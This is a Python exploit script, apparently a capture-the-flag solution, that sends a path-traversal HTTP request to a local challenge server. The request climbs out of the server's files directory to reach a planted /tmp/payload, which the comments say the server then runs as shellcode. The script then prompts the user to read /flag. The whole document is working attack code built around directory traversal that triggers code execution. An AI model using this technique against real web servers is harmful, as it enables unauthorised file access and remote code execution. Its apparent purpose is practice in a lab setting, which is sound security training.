import socket
import struct
import sys
import time

payload_path = "/tmp/payload"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 80))

    # Path traversal request
    # NOTE: The server code uses sprintf(resolved_path, "/challenge/files/%s", path);
    # So we need enough ../ to get to root, then into /tmp
    request = f"GET ../../../../../../../../..{payload_path} HTTP/1.1\r\n\r\n".encode()

    print("[*] Sending request...")
    s.send(request)

    print(s.recv(100))
    
    # Give the server a moment to process and execute shellcode
    time.sleep(0.5) 
    s.close()

    print("[*] Exploit sent successfully.")
    print("[*] Attempting to read flag...")
    
    # Optional: Try to cat the flag automatically if running locally
    # import os
    # os.system("cat /flag")
    print("[*] NOW RUN: cat /flag")

except ConnectionRefusedError:
    print("[!] Error: Could not connect to localhost:80. Is the challenge server running?")
except Exception as e:
    print(f"[!] An error occurred: {e}")
